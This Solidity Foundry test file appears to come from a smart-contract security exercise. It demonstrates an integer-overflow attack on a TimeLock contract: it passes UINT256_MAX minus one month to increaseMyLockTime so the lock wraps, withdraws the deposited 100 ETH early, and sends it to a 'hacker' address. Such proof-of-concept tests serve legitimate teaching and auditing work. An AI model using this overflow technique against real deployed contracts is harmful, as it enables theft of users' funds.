// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ITimeLock {
    function depositETH() external payable;
    function increaseMyLockTime(uint256 _secondsToIncrease) external;
    function withdrawETH() external;
}

contract TestAO1 is Test {
    uint256 constant ONE_MONTH = 30 * 24 * 60 * 60;
    uint256 constant VICTIM_DEPOSIT = 100 ether;

    address deployer = makeAddr("deployer");
    address victim = makeAddr("victim");
    address hacker = makeAddr("hacker");

    ITimeLock timeLockContract;

    function setUp() public {
        vm.deal(victim, VICTIM_DEPOSIT);
    }

    function test_Hack() public {
        vm.prank(deployer);
        address _timeLock = deployCode("TimeLock.sol");
        timeLockContract = ITimeLock(_timeLock);

        vm.startPrank(victim);
        timeLockContract.depositETH{value: VICTIM_DEPOSIT}();

        assertEq(address(victim).balance, 0);
        assertEq(address(timeLockContract).balance, VICTIM_DEPOSIT);

        // Attempting to overflow the lock time to enable immediate withdrawal
        timeLockContract.increaseMyLockTime(UINT256_MAX - ONE_MONTH);
        timeLockContract.withdrawETH();

        assertEq(address(victim).balance, VICTIM_DEPOSIT);

        (bool success,) = hacker.call{value: address(victim).balance}("");
        require(success, "Transfer failed to Hacker");

        assertEq(address(hacker).balance, VICTIM_DEPOSIT);

        vm.stopPrank();
    }
}
